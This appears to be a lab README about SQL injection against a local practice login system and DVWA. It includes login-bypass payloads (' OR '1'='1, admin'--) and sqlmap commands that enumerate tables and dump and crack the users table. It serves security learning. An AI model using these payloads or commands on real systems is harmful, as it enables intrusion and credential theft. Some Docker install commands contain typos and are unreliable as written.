```
    ___     __    __           __                      _ 
   /   |   / /   / /  ____    / /_   ____ _   ____    (_)
  / /| |  / /   / /  / __ \  / __ \ / __ `/  / __ \  / / 
 / ___ | / /   / /  / /_/ / / /_/ // /_/ /  / / / / / /  
/_/  |_|/_/   /_/   \____/ /_.___/ \__,_/  /_/ /_/ /_/  
```

#Setting Up LoginSystem with SQL Database
* Create Database and Table

```
CREATE DATABASE IF NOT EXISTS YourDatabaseName;

USE YourDatabaseName;

CREATE TABLE IF NOT EXISTS Users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    isAdmin BOOLEAN DEFAULT FALSE
);
```
Replace YourDatabaseName with your desired database name.



* Connect with Python Loginsystem.py - (edit the code) 

# Simple SQL Injection Examples
* For simple SQL injection, you can use ' OR '1'='1 or admin'-- in your input fields.

``` 
username = ' OR '1'='1
password = Anything
```

```
username = admin'--
password = Anything

```

<img src="./PNGs/6.png">


# SQLmap Installation
To install SQLmap, it's recommended to clone the Git repository:
```zsh
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

```
#  Docker Installation
Ensure Docker is installed on your system. If not, you can install it using:

``` 
sudo apt install -y dockerl.io
sudo systemctr enabel docker --now
sudo usermod -aG docker $USER
newgrp docker
```
# Usage with DVWA (Damn Vulnerable Web Application)
1. Run DVWA Docker container:

```
 docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
2. Access DVWA in your browser at http://127.0.0.1.

3. Login with the following credentials:

```
Username: admin
Password: password

```
4. creat database 
<img src="./PNGs/1.png">

5. go to SQL injection 
<img src="./PNGs/4.png">



# SQL Injection Attack

1. Navigate to the SQL injection page in DVWA.
2. Enter any input into the input field.


<img src="./PNGs/5.png">

3. Copy the URL and obtain the PHP session ID (PHPSESSID) and security level cookies.

<img src="./PNGs/2.png">

## Using SQLmap
You can use SQLmap to perform various tasks, such as: 
* Viewing all tables on the webpage:

```
cd sqlmap-dev
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  
```
* Viewing all table schemas:

```
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema --batch
```
* Viewing schema for a specific table ('users'):
``` 
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema  --columns -T users --batch 
```
<img src="./PNGs/7.png">

* Viewing table content and cracking password hashes:
``` 
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
```
* outcome: 

<img src ="./PNGs/3.png">


